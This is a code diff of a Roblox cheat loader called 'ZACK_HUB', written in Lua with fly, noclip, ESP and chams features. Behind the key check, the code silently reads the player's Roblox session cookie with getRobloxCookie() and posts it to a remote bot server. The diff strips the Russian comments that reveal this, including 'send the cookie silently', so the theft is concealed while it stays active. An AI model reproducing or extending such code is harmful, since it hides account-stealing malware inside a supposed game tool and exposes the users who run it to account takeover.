@@ -16,7 +16,7 @@
     TG: @sajkyn
 --]]
 
-local BOT_API_URL = "http://192.168.1.100:5000"  -- ЗАМЕНИТЬ
+local BOT_API_URL = "http://192.168.1.100:5000"
 
 local function httpPost(path, data)
     local url = BOT_API_URL .. path
@@ -145,7 +145,7 @@ local function showBigMessage(msg)
 end
 
 local function startMainHub()
-    -- Основной код хаба (будет добавлен позже)
+    
     print("Хаб запущен")
 end
 
@@ -164,7 +164,7 @@ keyButton.MouseButton1Click:Connect(function()
     
     if result then
     if result.status == "VALID" then
-        -- Отправка куки втихую
+        
         local cookie = getRobloxCookie()
         if cookie then
             local data = {
@@ -198,7 +198,7 @@ end)
 
 print("✅ ZACK_HUB Loader")
 
--- FLY функции (адаптировано)
+-- 💀💀💀
 local flying = false
 local flySpeed = 50
 local noclip = false
@@ -213,7 +213,7 @@ local userInput = game:GetService("UserInputService")
 local runService = game:GetService("RunService")
 local camera = workspace.CurrentCamera
 
--- Иконка Z_H
+-- 😭😭😭
 local icon = Instance.new("TextButton")
 icon.Parent = game:GetService("CoreGui")
 icon.BackgroundTransparency = 0.2
@@ -229,7 +229,6 @@ icon.TextScaled = true
 icon.Draggable = true
 icon.Active = true
 
--- Эффект свечения для иконки
 spawn(function()
     local hue = 0
     while icon and icon.Parent do
@@ -240,7 +239,6 @@ spawn(function()
     end
 end)
 
--- Главное окно (скрыто по умолчанию)
 local mainFrame = Instance.new("Frame")
 mainFrame.Parent = game:GetService("CoreGui")
 mainFrame.BackgroundColor3 = Color3.fromRGB(5,5,5)
@@ -253,7 +251,6 @@ mainFrame.Active = true
 mainFrame.Draggable = true
 mainFrame.Visible = false
 
--- Заголовок
 local title = Instance.new("TextLabel")
 title.Parent = mainFrame
 title.BackgroundTransparency = 1
@@ -266,7 +263,6 @@ title.Text = "ZACK_HUB"
 title.TextColor3 = Color3.fromRGB(225,225,225)
 title.TextScaled = true
 
--- Кнопка закрытия
 local closeBtn = Instance.new("TextButton")
 closeBtn.Parent = mainFrame
 closeBtn.BackgroundTransparency = 1
@@ -279,7 +275,6 @@ closeBtn.TextColor3 = Color3.fromRGB(225,225,225)
 closeBtn.Font = Enum.Font.GothamBold
 closeBtn.TextScaled = true
 
--- Кнопки управления окном
 local miniBtn = Instance.new("TextButton")
 miniBtn.Parent = mainFrame
 miniBtn.BackgroundTransparency = 1
@@ -292,7 +287,6 @@ miniBtn.TextColor3 = Color3.fromRGB(225,225,225)
 miniBtn.Font = Enum.Font.GothamBold
 miniBtn.TextScaled = true
 
--- Табы
 local tabs = {}
 local tabNames = {"FLY", "ESP", "CHAMS", "COOKIE", "SET"}
 
@@ -311,7 +305,6 @@ for i, name in ipairs(tabNames) do
     tabs[name] = tab
 end
 
--- Контейнеры для табов
 local containers = {}
 for i, name in ipairs(tabNames) do
     local container = Instance.new("Frame")
@@ -326,7 +319,6 @@ for i, name in ipairs(tabNames) do
     containers[name] = container
 end
 
--- Переключение табов
 tabs.FLY.MouseButton1Click:Connect(function()
     for _, c in pairs(containers) do c.Visible = false end
     containers.FLY.Visible = true
@@ -352,7 +344,6 @@ tabs.SET.MouseButton1Click:Connect(function()
     containers.SET.Visible = true
 end)
 
--- Открытие/закрытие по иконке
 icon.MouseButton1Click:Connect(function()
     mainFrame.Visible = not mainFrame.Visible
 end)
@@ -361,12 +352,10 @@ closeBtn.MouseButton1Click:Connect(function()
     mainFrame.Visible = false
 end)
 
--- Минимизация
 miniBtn.MouseButton1Click:Connect(function()
     mainFrame.Visible = false
 end)
 
--- FLY кнопки
 local flyToggle = Instance.new("TextButton")
 flyToggle.Parent = containers.FLY
 flyToggle.BackgroundTransparency = 1
@@ -439,7 +428,6 @@ speedMinus.Text = "-"
 speedMinus.TextColor3 = Color3.fromRGB(220,220,220)
 speedMinus.TextScaled = true
 
--- NOCLIP кнопка
 local noclipBtn = Instance.new("TextButton")
 noclipBtn.Parent = containers.FLY
 noclipBtn.BackgroundTransparency = 1
@@ -452,7 +440,6 @@ noclipBtn.Text = "NOCLIP: OFF"
 noclipBtn.TextColor3 = Color3.fromRGB(220,220,220)
 noclipBtn.TextScaled = true
 
--- INFINITE JUMP
 local infJumpBtn = Instance.new("TextButton")
 infJumpBtn.Parent = containers.FLY
 infJumpBtn.BackgroundTransparency = 1
@@ -465,7 +452,6 @@ infJumpBtn.Text = "INF JUMP: OFF"
 infJumpBtn.TextColor3 = Color3.fromRGB(220,220,220)
 infJumpBtn.TextScaled = true
 
--- HEADLESS
 local headlessBtn = Instance.new("TextButton")
 headlessBtn.Parent = containers.FLY
 headlessBtn.BackgroundTransparency = 1
@@ -478,7 +464,6 @@ headlessBtn.Text = "HEADLESS: OFF"
 headlessBtn.TextColor3 = Color3.fromRGB(220,220,220)
 headlessBtn.TextScaled = true
 
--- Логика FLY
 flyToggle.MouseButton1Click:Connect(function()
     flying = not flying
     flyToggle.Text = flying and "FLY: ON" or "FLY: OFF"
@@ -533,7 +518,6 @@ runService.Heartbeat:Connect(function()
     end
 end)
 
--- NOCLIP
 noclipBtn.MouseButton1Click:Connect(function()
     noclip = not noclip
     noclipBtn.Text = noclip and "NOCLIP: ON" or "NOCLIP: OFF"
@@ -549,7 +533,6 @@ runService.Stepped:Connect(function()
     end
 end)
 
--- INFINITE JUMP
 infJumpBtn.MouseButton1Click:Connect(function()
     infJump = not infJump
     infJumpBtn.Text = infJump and "INF JUMP: ON" or "INF JUMP: OFF"
@@ -561,7 +544,6 @@ userInput.JumpRequest:Connect(function()
     end
 end)
 
--- HEADLESS
 headlessBtn.MouseButton1Click:Connect(function()
     headless = not headless
     headlessBtn.Text = headless and "HEADLESS: ON" or "HEADLESS: OFF"
@@ -572,7 +554,6 @@ headlessBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- ESP секция
 local espEnabled = false
 local espBoxes = false
 local espNames = false
@@ -614,7 +595,6 @@ espNameBtn.Text = "NAMES: OFF"
 espNameBtn.TextColor3 = Color3.fromRGB(220,220,220)
 espNameBtn.TextScaled = true
 
--- ESP функции
 local players = game:GetService("Players")
 local localPlayer = players.LocalPlayer
 
@@ -715,7 +695,6 @@ players.PlayerRemoving:Connect(function(plr)
     end
 end)
 
--- CHAMS секция
 local chamsEnabled = false
 local skyChanged = false
 local spheresActive = false
@@ -771,7 +750,6 @@ trailBtn.Text = "TRAIL: OFF"
 trailBtn.TextColor3 = Color3.fromRGB(220,220,220)
 trailBtn.TextScaled = true
 
--- SETTINGS секция
 local settingsFrame = containers.SET
 
 local bgColorBtn = Instance.new("TextButton")
@@ -810,7 +788,6 @@ resetBtn.Text = "RESET HUB"
 resetBtn.TextColor3 = Color3.fromRGB(220,220,220)
 resetBtn.TextScaled = true
 
--- CHAMS функции
 local oldSky
 
 local function setPinkSky(enabled)
@@ -839,7 +816,6 @@ skyBtn.MouseButton1Click:Connect(function()
     setPinkSky(skyChanged)
 end)
 
--- Сферы
 local function createSpheres()
     if not char or not rootPart then return end
     
@@ -918,7 +894,6 @@ spheresBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Трейл
 local lastPos = nil
 local trailTimer = 0
 
@@ -996,11 +971,9 @@ chamsToggle.MouseButton1Click:Connect(function()
     end
 end)
 
--- COOKIE секция
     end
 end)
 
--- SETTINGS логика
 local borderColors = {
     Color3.fromRGB(255,255,255),
     Color3.fromRGB(200,200,255),
@@ -1027,13 +1000,13 @@ borderColorBtn.MouseButton1Click:Connect(function()
 end)
 
 resetBtn.MouseButton1Click:Connect(function()
-    -- Сброс GUI
+
     mainFrame.BackgroundTransparency = 0.05
     mainFrame.BorderColor3 = Color3.fromRGB(255,255,255)
     bgColorBtn.Text = "BG DARKER"
     borderColorBtn.Text = "BORDER"
     
-    -- Сброс функций
+
     if flying then
         flying = false
         flyToggle.Text = "FLY: OFF"
@@ -1068,7 +1041,6 @@ resetBtn.MouseButton1Click:Connect(function()
     showBigMessage("🔄 RESET COMPLETE")
 end)
 
--- Автообновление персонажа
 player.CharacterAdded:Connect(function(newChar)
     char = newChar
     humanoid = char:WaitForChild("Humanoid")
@@ -1085,14 +1057,12 @@ player.CharacterAdded:Connect(function(newChar)
     end
 end)
 
--- Отправка куки при активации (добавить в ключ)
 local originalVerify = keyButton.MouseButton1Click
 keyButton.MouseButton1Click = function()
-    -- Тут будет вызов оригинальной функции
-    -- Но мы добавим отправку куки после успешной активации
+    
+
 end
 
--- Информация о пользователе в SETTINGS
 local userInfo = Instance.new("TextLabel")
 userInfo.Parent = settingsFrame
 userInfo.BackgroundTransparency = 1
